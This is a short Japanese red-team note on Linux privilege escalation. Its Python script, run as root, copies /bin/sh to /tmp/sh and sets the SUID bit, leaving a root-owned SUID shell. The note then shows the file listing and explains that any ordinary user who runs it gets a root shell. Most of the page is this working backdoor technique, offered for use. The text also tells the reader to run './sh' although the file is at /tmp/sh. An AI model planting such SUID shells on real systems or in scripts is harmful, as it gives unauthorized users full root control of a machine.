---
title: Python
parent: Lin Privilege Escalation
grand_parent: Red Team
---

## Pythonで書かれているファイルに付与する例
# 必須条件
このPythonスクリプトが root権限で実行されること

# 理由：
一般ユーザはSUIDを自由に付与できない（所有者制約）
root所有バイナリを作れない

以下のPythonコードを実行した後、`./sh`を実行します。
```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('cp /bin/sh /tmp/sh ')
        os.system('chmod u+s /tmp/sh ')
except:
        sys.exit()
```
このコードは、`/bin/sh`を`/tmp/sh`にコピーし、`setuid`ビットを設定することで、`/tmp/sh`を実行するときに所有者の権限で実行されるようにします。

# 実際に起きる状態

もし root で実行された場合：
```bash
-rwsr-xr-x 1 root root ... /tmp/sh
```
👉 /tmp/sh は root所有のSUIDシェル

# 結果

一般ユーザが：
/tmp/shを実行すると：

👉 root権限のシェルが起動